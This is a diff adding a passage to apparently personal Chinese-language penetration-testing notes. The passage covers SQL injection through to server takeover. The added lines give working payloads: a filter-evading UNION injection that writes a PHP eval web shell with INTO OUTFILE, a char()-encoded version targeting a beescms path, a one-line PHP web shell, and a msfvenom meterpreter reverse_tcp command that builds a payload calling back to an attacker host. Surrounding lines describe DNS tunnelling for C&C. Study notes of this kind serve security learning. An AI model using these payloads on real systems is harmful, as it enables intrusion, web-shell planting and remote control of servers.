@@ -155,6 +155,26 @@
      1. 基于时间的盲注
      1. 基于布尔的盲注：返回页面判断条件真假的注入，部分盲注可以观察不同的HTTP状态码，确定响应时间、内容的长度，并在HTTP响应中的查看HTML内容来进行确认
 #### 服务器攻击
+1. 一次渗透的技术栈
+   - 查看技术栈，搜索通用漏洞
+   - 如sql注入
+     1. 通过post抓包sqlmap，dump出管理员账号密码，进后台找上传点
+     1. burp抓包，写入一句话，payload：admin%27 un union ion selselectect 1,2,3,4,<?php @eval($_POST[123]);?> into outfile 'xm.php'#，有防护写入失败可通过hex编码或char函数绕过
+        - hex编码：前面加0x或者直接用unhex函数
+        - mysql内置函数char()可以将里面的ascii码转换为字符串，如`payload为:admin' uni union on selselectect null,null,null,null,char(60, 63, 112, 104, 112, 32, 64, 101, 118, 97, 108, 40, 36, 95, 80, 79, 83, 84, 91, 99, 109, 100, 93, 41, 59, 63, 62) in into outoutfilefile 'C:/phpStudy/WWW/beescms/cmd.php'#`，用分隔的char来逃避
+   - getShell
+     1. php：<?php @eval(S_POST[cmd]);?>，上传脚本帮助getShell
+     1. 其他见招拆招
+   - 登录服务器：getshell完毕
+     1. 蚁剑
+     1. 菜刀
+   - 提权
+     1. windows
+        - msf生成木马：`payload:msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe X > shell.exe`，通过蚁剑上传木马
+        - 上传大马
+   - 体会
+     1. 见招拆招，先收集信息
+     1. 有很多现成的工具，需要积累
 1. DNS隧道：将其他协议的内容封装在DNS协议中，然后以DNS请求和响应包完成传输数据的技术。因为DNS必不可少，所以防火墙和入侵检测设备大都不会过滤DNS流量，为DNS成为隐蔽信道创造了条件，因此，DNS隧道在僵尸网络和APT攻击中扮演着重要的角色
    - 原理：DNS查询时如果查询的域名不在DNS服务器本机的缓存中，就会访问互联网进行查询，可以返回任意字符串，如返回加密的C&C指令实现控制被控端
    - 分类
